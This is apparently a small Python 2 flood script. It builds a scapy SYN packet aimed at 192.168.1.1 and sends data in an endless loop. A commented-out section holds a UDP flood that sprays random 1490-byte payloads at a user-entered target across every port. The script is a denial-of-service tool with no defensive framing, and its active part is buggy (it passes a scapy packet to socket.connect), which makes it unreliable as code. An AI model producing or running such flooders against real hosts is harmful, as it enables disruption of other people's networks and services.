#!/usr/bin/env python

import socket
import random
from scapy.all import *
from scapy.layers.inet import IP, TCP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 1024
bytes = random._urandom(1490)
ip = IP(dst='192.168.1.1', id=1111, ttl=128)
tcp = TCP(sport=RandShort(),dport=port,seq=0, ack=0,window=1000,flags="S")
data = 'SEZZER'
package = ip / tcp / data
sent = 0
sock.connect(ip/tcp)
while True:
    sock.send(data)
    sent +=1
    print "Sent %s packet to %s throught port %s"%(sent,'192.168.1.1',port)
# sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# bytes = random._urandom(1490)
# ip = raw_input('Target IP: ')
# port = input('Port: ')
# sent = 0
#
# while True:
#     sock.sendto(bytes, (ip,port))
#     sent = sent + 1
#     port = port + 1
#     print "Sent %s packet to %s throught port %s"%(sent,ip,port)
#     if port == 65534:
#         port = 1